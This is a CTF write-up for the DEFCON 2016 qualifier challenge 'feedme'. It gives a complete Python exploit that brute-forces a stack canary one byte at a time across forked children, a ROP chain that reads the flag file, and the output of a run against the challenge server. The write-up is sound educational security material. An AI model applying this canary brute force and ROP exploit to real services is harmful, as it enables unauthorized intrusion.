#feedme - DEFCON 2016

First at all execute `file` command on the binary
```

```

and with `checksec` we see that NX is enabled and debugging a little bit we realize that the usage of the binary is simple: a "parent" process launches child processes that takes 1 byte `x`, than reads `x` number of bytes. But the length of the buffer is 32, so if we send "\x36" + "A"*0x36 the canary is overwritten and smash the stack detected. 

So we have to leak the canary in order to overwrite the return address. The bug was that child's canary is always the same, so we can try to send 0x32 bytes of garbage and bruteforce the 33th byte (easy, always `\x00`), then the 34th, then the 35th and 36th one.

This part of the exploit is 

```python 
#!/usr/bin/env python2

import sys, socket, telnetlib
from struct import *
import random
import time
import binascii
import time
def recvuntil(t):
    data = ''
    while not data.endswith(t):
        tmp = s.recv(1)
        if not tmp: break
        data += tmp

    return data

def interactive():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p32(x): return pack('<I', x)
def u32(x): return unpack('<I', x)[0]
def p64(x): return pack('<Q', x)
def u64(x): return unpack('<Q', x)[0]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], int(sys.argv[2])))
recvuntil("FEED ME!\n")
canary = "\x00"
while len(canary)!=4:
	for brute in range(0,255):
		#print brute
		init = binascii.unhexlify(hex(32+len(canary)+1)[2:])
		garbage = "A"*32
		
		if len(hex(brute)[2:])==1:
			pad = "0"
		else:
			pad = ""
		tryLeakByteCanary = binascii.unhexlify(pad + hex(brute)[2:])
		s.send(init + garbage + canary+ tryLeakByteCanary)
		data = recvuntil("FEED ME!\n")
		if "YUM" in data:
			print "LEAKED: "  + str(tryLeakByteCanary)
			print data
			canary += tryLeakByteCanary
			break
```

and then we write a ROPchain that reads `flag` string, open `flag` file and write its content to std output (we spent a lot of time trying to execve /bin/sh, we wrote custumized ROPchain also. Only after some hours we decided to follow this way. After solving the challenge we read on IRC "pwnables have busybox -> /bin/sh. Your execve shell code is probably broken" -> **** off!).

```python
p = ''
p += p32(0x080bb496) #pop eax
p += p32(0x3)#read sys
p += p32(0x0806f370)  #pop edx pop ecx pop ebx
p += p32(0x5)#flag\x00
p += p32(0x080eaf80)#BSS address
p += p32(0x0)
p += p32(0x0806FA20) #int 80


p += p32(0x080bb496) #pop eax
p += p32(0x5) #fopen
p += p32(0x0806f370)  #pop edx pop ecx pop ebx
p += p32(0x0)
p += p32(0x0)
p += p32(0x080eaf80) #address of flag string
p += p32(0x0806FA20) #int 80

p += p32(0x080bb496) #pop eax
p += p32(0x3) #read sys
p += p32(0x0806f370)  #pop edx pop ecx pop ebx
p += p32(0x100) #length
p += p32(0x080ea060) #.data address
p += p32(0x2) #FD
p += p32(0x0806FA20) #int 80

p += p32(0x080bb496) #pop eax
p += p32(0x4) #write sys
p += p32(0x0806f370)  #pop edx pop ecx pop ebx
p += p32(0x100) #length
p += p32(0x080ea060)#address
p += p32(0x01) #FD
p += p32(0x0806FA20) #int 80
``` 

PWN THEM!!

```python
init = binascii.unhexlify(hex(len(garbage + canary + "A"*12 + p))[2:])
s.send(init + garbage + canary + "A"*12  + p)
print recvuntil("...\n")
print "interactive "
s.send("flag\x00")
interactive()
```

```bash
$ python exploit.py feedme_47aa9b0d8ad186754acd4bece3d6a177.quals.shallweplayaga.me 4092
LEAKED: R
ATE 41414141414141414141414141414141...
YUM, got 34 bytes!
Child exit.
FEED ME!

LEAKED: 
ATE 41414141414141414141414141414141...
YUM, got 35 bytes!
Child exit.
FEED ME!

LEAKED: �
ATE 41414141414141414141414141414141...
YUM, got 36 bytes!
Child exit.
FEED ME!

CHECK len(canary): 4
�anary: R
PWN THEM!!

ATE 41414141414141414141414141414141...

interactive 
The flag is: It's too bad! we c0uldn't??! d0 the R0P CHAIN BLIND TOO
��������@�
         Child exit.
FEED ME!
```

The full exploit is available here the full exploit is available [here](exploit.py)! 
